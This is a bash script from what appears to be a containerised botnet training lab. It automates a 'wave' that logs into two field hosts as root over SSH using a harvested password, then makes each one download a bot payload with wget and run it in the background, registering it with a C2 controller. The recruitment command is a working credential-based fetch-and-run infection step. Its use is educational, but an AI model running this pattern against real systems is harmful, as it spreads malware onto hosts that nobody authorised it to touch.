#!/usr/bin/env bash
# The wave that uses the second credential: recruit the two field hosts that
# were rotated to the password on no wordlist. The seventh action, which most
# labs do not have.
#
# It runs the recruitment the same way the learner did by hand in Part 1 and the
# standing task did in Part 2: an SSH login from the c2 followed by a fetch of
# the payload from the loader. So the loader's log and the roster grow exactly
# the way they would have, and the recruitment record Part 4's last question
# reads stays honest. Nothing here reaches into a container by a back door.
#
# The credential it uses is the one the harvest returned. The learner reads it
# off a result in Part 3, and this action is what turns that reading into two
# more bots. It is a separate action rather than part of the harvest task
# because the learner is meant to predict the new count before running it
# (question 8), and something other than their own typing has to be the thing
# that produces it.
#
# Idempotent: a host that is already a bot refuses the second install at the
# lock, so re-running this changes nothing. Exits non-zero with a plain message
# if the controller is not running, because a recruit with nowhere to register
# teaches the learner a failure the lab did not intend.
set -euo pipefail
source "$( dirname "${BASH_SOURCE[0]}" )/lib.sh"

log() { echo "[advance] $*"; }

running "$C2_CTN" || { echo "The lab is not running. Spawn it first." >&2; exit 1; }

if ! c2_running; then
    echo "The controller is not running, so a recruited host would have nothing to" >&2
    echo "register with. Start it on the c2 first:  docker exec -it $C2_CTN c2" >&2
    exit 1
fi

before="$( bot_count )"
log "population before this wave: ${before:-0}"

# Recruit each wave-2 host from the c2, over SSH, with the rotated password.
# ssh -n and the redirected, detached bot are what make the remote shell return
# instead of hanging on the payload's open descriptors; see the handout's Part 1
# note on the same command.
for h in "${WAVE2_HOSTS[@]}"; do
    addr="$( ip_of "$h" )"
    log "recruiting $h ($addr) with the rotated credential"
    docker exec "$C2_CTN" sshpass -p "$PW_WAVE2" ssh -n \
        -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout=8 "root@${addr}" \
        "wget -q ${BOT_URL} -O ${BOT_PATH}; nohup python3 ${BOT_PATH} </dev/null >/tmp/bot.out 2>&1 & echo installed" \
        >/dev/null 2>&1 \
        || log "  note: the login to $h did not complete; it may already be a bot"
done

# Give the two new hosts time to fetch, register, and (because a standing task
# is replayed on registration) run whatever the standing task is.
target=$(( before + ${#WAVE2_HOSTS[@]} ))
if wait_for_bots "$target" 40; then
    log "population is now $( bot_count ). The two rotated hosts have registered."
else
    log "population is $( bot_count ) after waiting; expected ${target}."
    log "If it is short, the credential may not match, or a host was already a bot."
fi

log "Take a fresh look with status. Nothing was told to you about what the new"
log "bots will do: if a standing task is set, they have already run it."
